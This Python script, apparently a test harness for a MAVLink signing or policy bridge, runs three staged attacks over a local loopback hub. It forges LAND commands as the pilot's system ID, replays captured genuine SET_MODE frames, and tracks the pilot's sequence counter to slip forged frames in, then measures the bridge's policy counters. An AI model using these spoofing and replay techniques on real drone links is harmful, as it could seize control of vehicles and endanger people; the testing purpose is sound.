"""Smart attacker on an UNSIGNED link (no key anywhere), via the loopback hub.

usage: attack2.py <tapfile> <stage[,stage...]>
  own      forged LAND as sysid 255 / compid 190 from the attacker's own sequence counter (pilot keeps sending)
  replay   byte-identical replay of the pilot's captured genuine SET_MODE(LOITER) frame, 3 times
  track    COUNTER-TRACKING attacker: after each new real pilot frame seen in the capture, send the forged LAND
           with the next expected sequence number (10 attempts)
Prints per stage: vehicle modes seen (heartbeats) and the delta of the bridge policy counters.
"""
import json
import os
import socket
import sys
import time
import urllib.request

os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil  # noqa: E402

tap = sys.argv[1]
stages = sys.argv[2].split(",")
sent = set()


def policy():
    s = json.load(urllib.request.urlopen("http://127.0.0.1:8090/status", timeout=3))
    return {k: v for k, v in (s.get("policy") or {}).items() if isinstance(v, int) and not isinstance(v, bool)}


def parse_tap():
    mav = mavutil.mavlink.MAVLink(None)
    mav.robust_parsing = True
    out = []
    for b in open(tap, "rb").read():
        msg = mav.parse_char(bytes([b]))
        if msg is not None:
            out.append(msg)
    return out


a = mavutil.mavlink_connection("tcp:127.0.0.1:5801", source_system=255, source_component=190)
modes = []


def watch(secs):
    end = time.time() + secs
    while time.time() < end:
        msg = a.recv_match(type="HEARTBEAT", blocking=True, timeout=0.2)
        if msg is not None and msg.get_srcSystem() == 1:
            modes.append(msg.custom_mode)


def send_forged_land(use_cmd=True):
    if use_cmd:
        a.mav.command_long_send(1, 1, 176, 0, 1, 9, 0, 0, 0, 0, 0)
    else:
        a.mav.set_mode_send(1, 1, 9)


def stage_own():
    for _ in range(5):
        send_forged_land(True)
        send_forged_land(False)
        watch(0.4)


def stage_replay():
    frames = [bytes(msg.get_msgbuf()) for msg in parse_tap()
              if msg.get_type() == "SET_MODE" and msg.custom_mode == 5 and msg.get_srcSystem() == 255
              and bytes(msg.get_msgbuf()) not in sent]
    print("captured genuine SET_MODE(LOITER) frames:", len(frames), flush=True)
    if frames:
        s = socket.create_connection(("127.0.0.1", 5801))
        for _ in range(3):
            s.sendall(frames[0])
            watch(0.7)
        s.close()


def stage_track():
    last_seen = -1
    deadline = time.time() + 40
    n = 0
    while n < 10 and time.time() < deadline:
        real = [msg for msg in parse_tap() if msg.get_srcSystem() == 255 and msg.get_srcComponent() == 190
                and bytes(msg.get_msgbuf()) not in sent]
        if real and real[-1].get_seq() != last_seen:
            last_seen = real[-1].get_seq()
            a.mav.seq = (last_seen + 1) % 256
            a.mav.command_long_send(1, 1, 176, 0, 1, 9, 0, 0, 0, 0, 0)
            n += 1
            print(f"track: pilot seq {last_seen} -> forged LAND seq {(last_seen + 1) % 256}", flush=True)
        watch(0.15)
    watch(2)


# remember what the attacker itself emits so that the tracker ignores it
orig_write = a.write


def tracked_write(buf):
    sent.add(bytes(buf))
    return orig_write(buf)


a.write = tracked_write
a.mav.file = a
watch(3)
print("mode before", modes[-1:] , "counters", policy(), flush=True)
for st in stages:
    before = policy()
    modes.clear()
    {"own": stage_own, "replay": stage_replay, "track": stage_track}[st]()
    watch(3)
    after = policy()
    delta = {k: after[k] - before.get(k, 0) for k in after if after[k] != before.get(k, 0)}
    print(f"STAGE {st}: modes_seen={sorted(set(modes))} LAND_seen={9 in modes} LOITER_seen={5 in modes} "
          f"delta={json.dumps(delta)}", flush=True)
print("attack done", flush=True)
